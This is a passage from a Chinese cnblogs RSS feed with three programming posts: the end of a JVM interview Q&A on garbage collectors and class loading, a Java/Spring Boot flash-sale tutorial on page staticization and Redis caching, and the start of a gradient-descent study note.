&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/630246/201908/630246-20190817005351257-559268104.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;p&gt;①占用CPU资源&lt;/p&gt;
&lt;p&gt;②无法处理并发标记期间产生的浮动垃圾&lt;/p&gt;
&lt;p&gt;③由于采用标记-清楚算法，会产生大量的内存碎片&lt;/p&gt;
&lt;p&gt;G1：应用于整个堆上的内存，物理上不再划分年轻代与老年代，只做逻辑保留，采用标记-整理算法，是一个可对停顿时间预测的低停顿、并发收集的GC回收器。它的GC过程同CMS类似，一共分为4个步骤：&lt;/p&gt;
&lt;p&gt;①初始标记，同CMS回收器一致，标记出存活的对象。&lt;/p&gt;
&lt;p&gt;②并发标记，同CMS回收器一致，和用户线程并发标记出存活的对象。&lt;/p&gt;
&lt;p&gt;③最终标记，同CMS回收器一致，修正在并发标记将期间用户线程新产生的对象。&lt;/p&gt;
&lt;p&gt;④筛选回收，这个阶段可根据用户期望的GC停顿时间制定回收计划。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/630246/201908/630246-20190817005552565-181314272.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 类在JVM中的加载过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Java文件被编译为Class字节码文件后被加载到JVM中，主要分为三步：加载 -&amp;gt; 连接 -&amp;gt; 初始化。连接过程又分为：验证 -&amp;gt; 准备 -&amp;gt; 解析。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/630246/201908/630246-20190817005616473-1126114772.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;9. 类是如何被加载到JVM中的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Java文件被编译成Class字节码文件后，通过类加载器被加载到JVM中。类加载器从上往下一共有：启动类加载器、扩展类加载器、应用程序类加载器、自定义类加载器。类先从自定义类加载器开始，逐层向上传递到启动类加载器，当启动类加载器不能加载时，再向扩展类加载器加载，这称为双亲委派模型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;10. 类加载器的双亲委派模型有什么好处&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设一个类首先被自定义类加载器加载，我们写Object类时，系统中就会出现不同的Object类。为了保证在系统中始终都只有一个Object类，方法就是它们都通过启动类加载器加载。&lt;/p&gt;
&lt;p&gt;这是一个能给程序员加buff的公众号 （CoderBuff）&lt;/p&gt;
&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/630246/201907/630246-20190717223740465-1981496921.png&quot;/&gt;&lt;/div&gt;
</description>
<pubDate>Fri, 16 Aug 2019 16:57:00 +0000</pubDate>
<dc:creator>OKevin</dc:creator>
<og:description>1. JVM运行时划分哪几个区域？哪些区域是线程共享的？哪些区域是线程独占的？ JVM运行时一共划分：程序计数器、虚拟机栈、堆、本地方法栈、方法区。 线程共享的数据区域：堆、方法区。 线程独享的数据区</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yulinfeng/p/11367096.html</dc:identifier>
</item>
<item>
<title>java秒杀系列（2）- 页面静态化技术 - 福龙苑居士</title>
<link>http://www.cnblogs.com/fulongyuanjushi/p/11367038.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fulongyuanjushi/p/11367038.html</guid>
<description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
&lt;p&gt;通过代码片段分别介绍服务端渲染、客户端渲染、对象缓存三种方式的写法。&lt;br/&gt;代码片段仅供参考，具体实现需要根据业务场景自行适配，但思想都是一样。&lt;/p&gt;

&lt;h3 id=&quot;一服务端渲染方式&quot;&gt;一、服务端渲染方式&lt;/h3&gt;

&lt;h4 id=&quot;接口返回html页面的设置&quot;&gt;1、接口返回html页面的设置&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Autowired
ThymeleafViewResolver thymeleafViewResolver;
@Autowired
ApplicationContext applicationContext;

@RequestMapping(value=&quot;/to_list&quot;, produces=&quot;text/html&quot;)
@ResponseBody
public String goodsList() {
    // 业务逻辑
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;先从缓存中取有就返回&quot;&gt;2、先从缓存中取，有就返回。&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//取缓存
String html = redisService.get(GoodsKey.getGoodsList, &quot;&quot;, String.class);
if(!StringUtils.isEmpty(html)) {
    return html;
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;缓存中没有就手动渲染&quot;&gt;3、缓存中没有，就手动渲染。&lt;/h4&gt;
&lt;p&gt;springboot1.5.x的写法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;List&amp;lt;GoodsVo&amp;gt; goodsList = goodsService.listGoodsVo();
model.addAttribute(&quot;goodsList&quot;, goodsList);
SpringWebContext ctx = new SpringWebContext(request,response, request.getServletContext(),request.getLocale(), model.asMap(), applicationContext );
//手动渲染
html = thymeleafViewResolver.getTemplateEngine().process(&quot;goods_list&quot;, ctx);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;springboot2.x的写法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;WebContext ctx = new WebContext(request, response, request.getServletContext(),  request.getLocale(), model.asMap());
//手动渲染
html = thymeleafViewResolver.getTemplateEngine().process(&quot;goods_list&quot;, ctx);&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;最后再将渲染内容加入到redis&quot;&gt;4、最后再将渲染内容加入到redis&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;if(!StringUtils.isEmpty(html)) {
    redisService.set(GoodsKey.getGoodsList, &quot;&quot;, html);
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h3 id=&quot;二客户端渲染方式商品详情页&quot;&gt;二、客户端渲染方式（商品详情页）&lt;/h3&gt;

&lt;h4 id=&quot;找到跳转到商品详情页的路径修改为一个静态html的路径&quot;&gt;1、找到跳转到商品详情页的路径，修改为一个静态html的路径。&lt;/h4&gt;
&lt;p&gt;在商品列表页，找到跳转到详情页的动态路径，直接修改为一个静态路径，后缀为htm或shtml，总之不要是html即可，因为application.properties中一般会配置后缀为html的都访问templates文件夹下的。&lt;br/&gt;注意代码中详情的链接，指向一个静态页面goods_detail.htm：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;body&amp;gt;

&amp;lt;div class=&quot;panel panel-default&quot; style=&quot;height:100%;background-color:rgba(222,222,222,0.8)&quot;&amp;gt;
  &amp;lt;div class=&quot;panel-heading&quot;&amp;gt;秒杀商品列表&amp;lt;/div&amp;gt;
  &amp;lt;table class=&quot;table&quot; id=&quot;goodslist&quot;&amp;gt;
    &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;商品名称&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;商品图片&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;商品原价&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;秒杀价&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;库存数量&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;详情&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
    &amp;lt;tr  th:each=&quot;goods,goodsStat : ${goodsList}&quot;&amp;gt;  
                &amp;lt;td th:text=&quot;${goods.goodsName}&quot;&amp;gt;&amp;lt;/td&amp;gt;  
                &amp;lt;td &amp;gt;&amp;lt;img th:src=&quot;@{${goods.goodsImg}}&quot; width=&quot;100&quot; height=&quot;100&quot; /&amp;gt;&amp;lt;/td&amp;gt;  
                &amp;lt;td th:text=&quot;${goods.goodsPrice}&quot;&amp;gt;&amp;lt;/td&amp;gt;  
                &amp;lt;td th:text=&quot;${goods.miaoshaPrice}&quot;&amp;gt;&amp;lt;/td&amp;gt;  
                &amp;lt;td th:text=&quot;${goods.stockCount}&quot;&amp;gt;&amp;lt;/td&amp;gt;
                &amp;lt;td&amp;gt;&amp;lt;a th:href=&quot;'/goods_detail.htm?goodsId='+${goods.id}&quot;&amp;gt;详情&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;  
  &amp;lt;/table&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;根据1的路径在static目录下新建一个goods_detail.htm文件原本动态页面上的模板语言都去掉换成idxx然后使用ajax来渲染静态文件中的数据即可&quot;&gt;2、根据1的路径，在static目录下新建一个goods_detail.htm文件，原本动态页面上的模板语言都去掉，换成id=“xx”，然后使用ajax来渲染静态文件中的数据即可。&lt;/h4&gt;
&lt;p&gt;原始动态页面：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;div class=&quot;panel panel-default&quot;&amp;gt;
  &amp;lt;div class=&quot;panel-heading&quot;&amp;gt;秒杀商品详情&amp;lt;/div&amp;gt;
  &amp;lt;div class=&quot;panel-body&quot;&amp;gt;
    &amp;lt;span th:if=&quot;${user eq null}&quot;&amp;gt; 您还没有登录，请登陆后再操作&amp;lt;br/&amp;gt;&amp;lt;/span&amp;gt;
    &amp;lt;span&amp;gt;没有收货地址的提示。。。&amp;lt;/span&amp;gt;
  &amp;lt;/div&amp;gt;
  &amp;lt;table class=&quot;table&quot; id=&quot;goodslist&quot;&amp;gt;
    &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;商品名称&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot; th:text=&quot;${goods.goodsName}&quot;&amp;gt;&amp;lt;/td&amp;gt; 
     &amp;lt;/tr&amp;gt;  
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;商品图片&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot;&amp;gt;&amp;lt;img th:src=&quot;@{${goods.goodsImg}}&quot; width=&quot;200&quot; height=&quot;200&quot; /&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;秒杀开始时间&amp;lt;/td&amp;gt;  
        &amp;lt;td th:text=&quot;${#dates.format(goods.startDate, 'yyyy-MM-dd HH:mm:ss')}&quot;&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td id=&quot;miaoshaTip&quot;&amp;gt;    
            &amp;lt;input type=&quot;hidden&quot; id=&quot;remainSeconds&quot; th:value=&quot;${remainSeconds}&quot; /&amp;gt;
            &amp;lt;span th:if=&quot;${miaoshaStatus eq 0}&quot;&amp;gt;秒杀倒计时：&amp;lt;span id=&quot;countDown&quot; th:text=&quot;${remainSeconds}&quot;&amp;gt;&amp;lt;/span&amp;gt;秒&amp;lt;/span&amp;gt;
            &amp;lt;span th:if=&quot;${miaoshaStatus eq 1}&quot;&amp;gt;秒杀进行中&amp;lt;/span&amp;gt;
            &amp;lt;span th:if=&quot;${miaoshaStatus eq 2}&quot;&amp;gt;秒杀已结束&amp;lt;/span&amp;gt;
        &amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;
            &amp;lt;form id=&quot;miaoshaForm&quot; method=&quot;post&quot; action=&quot;/miaosha/do_miaosha&quot;&amp;gt;
                &amp;lt;button class=&quot;btn btn-primary btn-block&quot; type=&quot;submit&quot; id=&quot;buyButton&quot;&amp;gt;立即秒杀&amp;lt;/button&amp;gt;
                &amp;lt;input type=&quot;hidden&quot; name=&quot;goodsId&quot; th:value=&quot;${goods.id}&quot; /&amp;gt;
            &amp;lt;/form&amp;gt;
        &amp;lt;/td&amp;gt;
     &amp;lt;/tr&amp;gt;
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;商品原价&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot; th:text=&quot;${goods.goodsPrice}&quot;&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
      &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;秒杀价&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot; th:text=&quot;${goods.miaoshaPrice}&quot;&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;库存数量&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot; th:text=&quot;${goods.stockCount}&quot;&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
  &amp;lt;/table&amp;gt;
&amp;lt;/div&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;静态化之后的页面：可以看到，动态模板语言都去掉了，直接通过JS来赋值。&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;div class=&quot;panel panel-default&quot; style=&quot;height:100%;background-color:rgba(222,222,222,0.8)&quot; &amp;gt;
  &amp;lt;div class=&quot;panel-heading&quot;&amp;gt;秒杀商品详情&amp;lt;/div&amp;gt;
  &amp;lt;div class=&quot;panel-body&quot;&amp;gt;
    &amp;lt;span id=&quot;userTip&quot;&amp;gt; 您还没有登录，请登陆后再操作&amp;lt;br/&amp;gt;&amp;lt;/span&amp;gt;
    &amp;lt;span&amp;gt;没有收货地址的提示。。。&amp;lt;/span&amp;gt;
  &amp;lt;/div&amp;gt;
  &amp;lt;table class=&quot;table&quot; id=&quot;goodslist&quot;&amp;gt;
    &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;商品名称&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot; id=&quot;goodsName&quot;&amp;gt;&amp;lt;/td&amp;gt; 
     &amp;lt;/tr&amp;gt;  
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;商品图片&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot;&amp;gt;&amp;lt;img  id=&quot;goodsImg&quot; width=&quot;200&quot; height=&quot;200&quot; /&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;秒杀开始时间&amp;lt;/td&amp;gt;  
        &amp;lt;td id=&quot;startTime&quot;&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td &amp;gt;   
            &amp;lt;input type=&quot;hidden&quot; id=&quot;remainSeconds&quot; /&amp;gt;
            &amp;lt;span id=&quot;miaoshaTip&quot;&amp;gt;&amp;lt;/span&amp;gt;
        &amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;
        &amp;lt;!--  
            &amp;lt;form id=&quot;miaoshaForm&quot; method=&quot;post&quot; action=&quot;/miaosha/do_miaosha&quot;&amp;gt;
                &amp;lt;button class=&quot;btn btn-primary btn-block&quot; type=&quot;submit&quot; id=&quot;buyButton&quot;&amp;gt;立即秒杀&amp;lt;/button&amp;gt;
                &amp;lt;input type=&quot;hidden&quot; name=&quot;goodsId&quot;  id=&quot;goodsId&quot; /&amp;gt;
            &amp;lt;/form&amp;gt;--&amp;gt;
            &amp;lt;div class=&quot;row&quot;&amp;gt;
                &amp;lt;div class=&quot;form-inline&quot;&amp;gt;
                    &amp;lt;img id=&quot;verifyCodeImg&quot; width=&quot;80&quot; height=&quot;32&quot;  style=&quot;display:none&quot; onclick=&quot;refreshVerifyCode()&quot;/&amp;gt;
                    &amp;lt;input id=&quot;verifyCode&quot;  class=&quot;form-control&quot; style=&quot;display:none&quot;/&amp;gt;
                    &amp;lt;button class=&quot;btn btn-primary&quot; type=&quot;button&quot; id=&quot;buyButton&quot;onclick=&quot;getMiaoshaPath()&quot;&amp;gt;立即秒杀&amp;lt;/button&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;input type=&quot;hidden&quot; name=&quot;goodsId&quot;  id=&quot;goodsId&quot; /&amp;gt;
        &amp;lt;/td&amp;gt;
     &amp;lt;/tr&amp;gt;
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;商品原价&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot; id=&quot;goodsPrice&quot;&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
      &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;秒杀价&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot;  id=&quot;miaoshaPrice&quot;&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
     &amp;lt;tr&amp;gt;  
        &amp;lt;td&amp;gt;库存数量&amp;lt;/td&amp;gt;  
        &amp;lt;td colspan=&quot;3&quot;  id=&quot;stockCount&quot;&amp;gt;&amp;lt;/td&amp;gt;  
     &amp;lt;/tr&amp;gt;
  &amp;lt;/table&amp;gt;
&amp;lt;/div&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;核心js代码：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;&amp;lt;script&amp;gt;

$(function(){
   getDetail();
});

function getDetail(){
   var goodsId = g_getQueryString(&quot;goodsId&quot;);
   $.ajax({
      url:&quot;/goods/detail/&quot;+goodsId,
      type:&quot;GET&quot;,
      success:function(data){
         if(data.code == 0){
            render(data.data);
         }else{
            layer.msg(data.msg);
         }
      },
      error:function(){
         layer.msg(&quot;客户端请求有误&quot;);
      }
   });
}

function render(detail){
   var miaoshaStatus = detail.miaoshaStatus;
   var  remainSeconds = detail.remainSeconds;
   var goods = detail.goods;
   var user = detail.user;
   if(user){
      $(&quot;#userTip&quot;).hide();
   }
   $(&quot;#goodsName&quot;).text(goods.goodsName);
   $(&quot;#goodsImg&quot;).attr(&quot;src&quot;, goods.goodsImg);
   $(&quot;#startTime&quot;).text(new Date(goods.startDate).format(&quot;yyyy-MM-dd hh:mm:ss&quot;));
   $(&quot;#remainSeconds&quot;).val(remainSeconds);
   $(&quot;#goodsId&quot;).val(goods.id);
   $(&quot;#goodsPrice&quot;).text(goods.goodsPrice);
   $(&quot;#miaoshaPrice&quot;).text(goods.miaoshaPrice);
   $(&quot;#stockCount&quot;).text(goods.stockCount);
   countDown(); // 判断秒杀开始状态
}

// 判断秒杀开始状态
function countDown(){
    var remainSeconds = $(&quot;#remainSeconds&quot;).val();
    var timeout;
    if(remainSeconds &amp;gt; 0){//秒杀还没开始，倒计时
       $(&quot;#buyButton&quot;).attr(&quot;disabled&quot;, true);
       $(&quot;#miaoshaTip&quot;).html(&quot;秒杀倒计时：&quot;+remainSeconds+&quot;秒&quot;);
        timeout = setTimeout(function(){
            $(&quot;#countDown&quot;).text(remainSeconds - 1);
            $(&quot;#remainSeconds&quot;).val(remainSeconds - 1);
            countDown();
        },1000);
    }else if(remainSeconds == 0){//秒杀进行中
        $(&quot;#buyButton&quot;).attr(&quot;disabled&quot;, false);
        if(timeout){
            clearTimeout(timeout);
        }
        $(&quot;#miaoshaTip&quot;).html(&quot;秒杀进行中&quot;);
        $(&quot;#verifyCodeImg&quot;).attr(&quot;src&quot;, &quot;/miaosha/verifyCode?goodsId=&quot;+$(&quot;#goodsId&quot;).val());
        $(&quot;#verifyCodeImg&quot;).show();
        $(&quot;#verifyCode&quot;).show();
    }else{//秒杀已经结束
        $(&quot;#buyButton&quot;).attr(&quot;disabled&quot;, true);
        $(&quot;#miaoshaTip&quot;).html(&quot;秒杀已经结束&quot;);
        $(&quot;#verifyCodeImg&quot;).hide();
        $(&quot;#verifyCode&quot;).hide();
    }
}

&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;记得服务端返回json格式数据给静态页面做数据绑定&quot;&gt;3、记得服务端返回json格式数据，给静态页面做数据绑定。&lt;/h4&gt;

&lt;h3 id=&quot;三客户端渲染方式秒杀接口&quot;&gt;三、客户端渲染方式（秒杀接口）&lt;/h3&gt;
&lt;p&gt;和第二点的操作基本一样，也是去除动态模板语言，改为ajax渲染。&lt;br/&gt;不同的地方：&lt;br/&gt;1）、多了一些springboot的配置；&lt;br/&gt;2）、GET和POST的区别，这里一定要用POST，有一些场景比如删除操作，如果用了GET比如delete?id=XX这样的写法，那么搜索引擎扫描到会自动帮你删除了，所以一定要写清楚类型。&lt;/p&gt;
&lt;h4 id=&quot;springboot-1.5.x的配置&quot;&gt;1、springboot-1.5.x的配置&lt;/h4&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;spring.resources.add-mappings=true #是否启用默认资源处理
spring.resources.cache-period= 3600 #缓存时间
spring.resources.chain.cache=true #是否在资源链中启用缓存
spring.resources.chain.enabled=true #是否启用Spring资源处理链。默认情况下，禁用，除非至少启用了一个策略。
spring.resources.chain.gzipped=true #是否对缓存压缩
spring.resources.chain.html-application-cache=true #是否启用HTML5应用程序缓存清单重写
spring.resources.static-locations=classpath:/static/ #静态资源的位置&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;springboot2.1.1的官方配置&quot;&gt;2、springboot2.1.1的官方配置&lt;/h4&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;spring.resources.add-mappings=true # 是否启用默认资源处理
spring.resources.cache.cachecontrol.cache-private= # 表示响应消息是针对单个用户的，不能由共享缓存存储。
spring.resources.cache.cachecontrol.cache-public= # 表示任何缓存都可以存储响应
spring.resources.cache.cachecontrol.max-age= # 响应被缓存的最大时间，如果没有指定持续时间后缀，以秒为单位。
spring.resources.cache.cachecontrol.must-revalidate= # 表明，一旦缓存过期，在未与服务器重新验证之前，缓存不能使用响应。
spring.resources.cache.cachecontrol.no-cache= # 表示缓存的响应只有在服务器重新验证时才能重用
spring.resources.cache.cachecontrol.no-store= # 表示在任何情况下都不缓存响应
spring.resources.cache.cachecontrol.no-transform= # 指示中介(缓存和其他)它们不应该转换响应内容
spring.resources.cache.cachecontrol.proxy-revalidate= # 与“must-revalidate”指令的含义相同，只是它不适用于私有缓存。
spring.resources.cache.cachecontrol.s-max-age= # 响应被共享缓存缓存的最大时间，如果没有指定持续时间后缀，以秒为单位。
spring.resources.cache.cachecontrol.stale-if-error= # 当遇到错误时，响应可能使用的最大时间，如果没有指定持续时间后缀，以秒为单位。
spring.resources.cache.cachecontrol.stale-while-revalidate= # 如果没有指定持续时间后缀，则响应在过期后可以提供的最长时间(以秒为单位)。
spring.resources.cache.period= # 资源处理程序提供的资源的缓存周期。如果没有指定持续时间后缀，将使用秒。
spring.resources.chain.cache=true # 是否在资源链中启用缓存。
spring.resources.chain.compressed=false # 是否启用已压缩资源(gzip, brotli)的解析。
spring.resources.chain.enabled= # 是否启用Spring资源处理链。默认情况下，禁用，除非至少启用了一个策略。
spring.resources.chain.html-application-cache=false # 是否启用HTML5应用缓存清单重写。
spring.resources.chain.strategy.content.enabled=false # 是否启用内容版本策略。
spring.resources.chain.strategy.content.paths=/** # 应用于内容版本策略的以逗号分隔的模式列表。
spring.resources.chain.strategy.fixed.enabled=false # 是否启用固定版本策略。
spring.resources.chain.strategy.fixed.paths=/** # 用于固定版本策略的以逗号分隔的模式列表。
spring.resources.chain.strategy.fixed.version= # 用于固定版本策略的版本字符串。
spring.resources.static-locations=classpath:/META-INF/resources/,classpath:/resources/,classpath:/static/,classpath:/public/ # 静态资源的位置。&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;第二点在点击按钮时调用的js方法getmiaoshapath如下&quot;&gt;3、第二点在点击&amp;lt;立即秒杀&amp;gt;按钮时调用的JS方法getMiaoshaPath()如下&lt;/h4&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;&amp;lt;script&amp;gt;

function getMiaoshaPath(){
    var goodsId = $(&quot;#goodsId&quot;).val();
    g_showLoading();
    $.ajax({
        url:&quot;/miaosha/path&quot;,
        type:&quot;GET&quot;,
        data:{
            goodsId:goodsId,
            verifyCode:$(&quot;#verifyCode&quot;).val()
        },
        success:function(data){
            if(data.code == 0){
                var path = data.data;
                doMiaosha(path);
            }else{
                layer.msg(data.msg);
            }
        },
        error:function(){
            layer.msg(&quot;客户端请求有误&quot;);
        }
    });
}

function doMiaosha(path){
    $.ajax({
        url:&quot;/miaosha/&quot;+path+&quot;/do_miaosha&quot;,
        type:&quot;POST&quot;,
        data:{
            goodsId:$(&quot;#goodsId&quot;).val()
        },
        success:function(data){
            if(data.code == 0){
                //window.location.href=&quot;/order_detail.htm?orderId=&quot;+data.data.id;
                getMiaoshaResult($(&quot;#goodsId&quot;).val());
            }else{
                layer.msg(data.msg);
            }
        },
        error:function(){
            layer.msg(&quot;客户端请求有误&quot;);
        }
    });
    
}

function getMiaoshaResult(goodsId){
    g_showLoading();
    $.ajax({
        url:&quot;/miaosha/result&quot;,
        type:&quot;GET&quot;,
        data:{
            goodsId:$(&quot;#goodsId&quot;).val(),
        },
        success:function(data){
            if(data.code == 0){
                var result = data.data;
                if(result &amp;lt; 0){
                    layer.msg(&quot;对不起，秒杀失败&quot;);
                }else if(result == 0){//继续轮询
                    setTimeout(function(){
                        getMiaoshaResult(goodsId);
                    }, 200);
                }else{
                    layer.confirm(&quot;恭喜你，秒杀成功！查看订单？&quot;, {btn:[&quot;确定&quot;,&quot;取消&quot;]},
                            function(){
                                window.location.href=&quot;/order_detail.htm?orderId=&quot;+result;
                            },
                            function(){
                                layer.closeAll();
                            });
                }
            }else{
                layer.msg(data.msg);
            }
        },
        error:function(){
            layer.msg(&quot;客户端请求有误&quot;);
        }
    });
}

&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;h3 id=&quot;四对象缓存&quot;&gt;四、对象缓存&lt;/h3&gt;
&lt;p&gt;最基本最常用的缓存处理逻辑：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;失效：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。&lt;/li&gt;
&lt;li&gt;命中：应用程序从cache中取数据，取到后返回。&lt;/li&gt;
&lt;li&gt;更新：先把数据存到数据库中，成功后，再让缓存失效。&lt;p&gt;参考代码：&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 先查缓存，再查数据库。
public MiaoshaUser getById(long id) {
   //取缓存
   MiaoshaUser user = redisService.get(MiaoshaUserKey.getById, &quot;&quot;+id, MiaoshaUser.class);
   if(user != null) {
      return user;
   }
   //取数据库
   user = miaoshaUserDao.getById(id);
   if(user != null) {
      redisService.set(MiaoshaUserKey.getById, &quot;&quot;+id, user);
   }
   return user;
}

// 更新数据库后，缓存也要做同步更新。
public boolean updatePassword(String token, long id, String formPass) {
   //取user
   MiaoshaUser user = getById(id);
   if(user == null) {
      throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST);
   }
   //更新数据库
   MiaoshaUser toBeUpdate = new MiaoshaUser();
   toBeUpdate.setId(id);
   toBeUpdate.setPassword(MD5Util.formPassToDBPass(formPass, user.getSalt()));
   miaoshaUserDao.update(toBeUpdate);
   //处理缓存
   redisService.delete(MiaoshaUserKey.getById, &quot;&quot;+id);
   user.setPassword(toBeUpdate.getPassword());
   redisService.set(MiaoshaUserKey.token, token, user);
   return true;
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;

</description>
<pubDate>Fri, 16 Aug 2019 16:38:00 +0000</pubDate>
<dc:creator>福龙苑居士</dc:creator>
<og:description>前言 通过代码片段分别介绍服务端渲染、客户端渲染、对象缓存三种方式的写法。 代码片段仅供参考，具体实现需要根据业务场景自行适配，但思想都是一样。 一、服务端渲染方式 1、接口返回html页面的设置 2</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/fulongyuanjushi/p/11367038.html</dc:identifier>
</item>
<item>
<title>100天搞定机器学习|Day36用有趣的方式解释梯度下降算法 - jpld</title>
<link>http://www.cnblogs.com/jpld/p/11366996.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jpld/p/11366996.html</guid>
<description>&lt;p&gt;本文为3Blue1Brown神经网络课程讲解第二部分《Gradient descent, how neural networks learn 》的学习笔记，观看地址：www.bilibili.com/video/av16144388前文我们已经搭建了一个包含两个隐藏层的神经网络，我们需要这样一种算法：网络得到训练数据后，算法会调整所有的权重和偏置值，提高网络对训练数据的表现。我们还希望这种分层结构可以举一反三，识别其他图像。训练好网络后，再给它未见过的带标记的数据作为测试，这样就能知道新图像分类的准确度。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002540174-364818806.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这实际上就是找某个函数的最小值，在一开始，我们会完全随机地初始化所有的权重和偏置值。可想而知，这个网络对于给定的训练示例，会表现得非常糟糕。例如输入一个3的图像，理想状态应该是输出层3这个点最亮。可是实际情况并不是这样。这是就需定义一个代价函数。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002541038-2029996598.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;网络可以对图像正确分类时，这个平方和就比较小，反之就很大。接下来就要考虑几万个训练样本中代价的平均值。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002541680-509960792.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
